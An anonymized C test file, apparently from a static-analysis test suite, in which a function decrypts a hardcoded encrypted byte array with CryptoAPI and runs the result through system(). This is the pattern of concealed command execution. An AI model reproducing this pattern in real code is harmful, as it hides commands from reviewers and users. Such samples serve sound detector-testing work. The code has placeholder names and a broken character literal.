#VAR1 ""
#VAR1 <VAR2.VAR3>
#VAR1 <VAR4.VAR3>
#VAR5 FUN1(VAR6, "")
#define VAR7 "" 
int FUN2()
{
    return 1;
}
int FUN3()
{
    return 0;
}
void FUN4()
{
    if(FUN2())
    {
        {
            BYTE VAR8[20] = {0xfb, 0x50, 0xe5, 0x8d, 0xc5, 0x4b, 0xdd, 0xe0, 0x26, 0x2b, 0x98, 0x49, 0x73, 0xfb, 0x4c, 0xf6};
            DWORD VAR9 = strlen((char *)VAR8);
            HCRYPTPROV VAR10 = 0;
            HCRYPTHASH VAR11 = 0;
            HCRYPTKEY VAR12 = 0;
            char VAR13[100] = VAR7;
            do
            {
                if(!FUN5(&VAR10, NULL, VAR14, VAR15, 0))
                {
                    break;
                }
                if(!FUN6(VAR10, VAR16, 0, 0, &VAR11))
                {
                    break;
                }
                if(!FUN7(VAR11, (VAR17*)VAR13, strlen(VAR13), 0))
                {
                    break;
                }
                if(!FUN8(VAR10, VAR18, VAR11, 0, &VAR12))
                {
                    break;
                }
                if(!FUN9(VAR12, 0, 1, 0, (VAR17 *)VAR8, &VAR9))
                {
                    break;
                }
                VAR8[VAR9] = '';
                if(system((char*)VAR8) <= 0)
                {
                    FUN10(1);
                }
            }
            while (0);
            if (VAR12)
            {
                FUN11(VAR12);
            }
            if (VAR11)
            {
                FUN12(VAR11);
            }
            if (VAR10)
            {
                FUN13(VAR10, 0);
            }
        }
    }
}
int main(int argc, char * argv[])
{
    srand( (unsigned)FUN14(NULL) );
    FUN4();
    return 0;
}